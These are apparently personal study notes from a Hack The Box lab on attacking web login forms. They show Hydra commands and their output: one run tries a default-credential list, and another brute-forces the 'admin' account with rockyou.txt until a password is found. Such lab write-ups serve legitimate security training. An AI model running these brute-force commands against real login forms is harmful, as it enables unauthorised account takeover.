
***
###### `Title :- Login Form Attacks`
###### `Created on :- 2023-06-26 - 06:28`
###### `Created by:- Prem J`
***

- We don't have any information on usernames and passwords of the `login.php` form, we have the option to test the web application form for default credentials in combination with the `http-post-form` module.

#### `Default Credentials -->`

```shell-session
premjampuram@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

- As we can see, we were not able to identify any working credentials

#### `Password Wordlist -->`

+ Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as `admin`, `administrator`, `wpadmin`, `root`, `adm`, and similar are used in administration panels and are rarely changed
+ among those most common username is `admin`.

```shell-session
prem@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

- Here we limited the stuff as well as possible making less noise. And found the login credentials to the admin pannel.
